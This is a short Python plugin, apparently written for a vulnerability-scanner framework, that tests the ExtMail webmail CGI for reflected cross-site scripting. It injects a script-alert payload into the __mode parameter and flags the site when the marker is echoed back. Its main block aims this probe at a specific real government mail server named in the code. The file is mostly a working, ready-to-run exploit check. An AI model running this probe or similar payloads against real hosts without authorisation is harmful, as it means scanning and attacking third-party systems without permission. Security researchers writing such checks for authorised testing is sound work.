#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = 'ifk' 
#Refer http://www.wooyun.org/bugs/wooyun-2010-015005

def assign(service, arg): 
    if service == "extmail":
        return True, arg
		
def audit(arg): 
    payload = 'extmail/cgi/index.cgi?__mode=<script>alert(\'testvul\')</script>'
    code, head, res, errcode, _ = curl.curl2(arg+payload)
    if code == 200 and 'testvul' in res:
        security_info('反射型 xss '+arg+payload)         
				
if __name__ == '__main__': 
    from dummy import *
    audit(assign('extmail', 'http://mail.ca.suzhou.gov.cn/')[1])
	
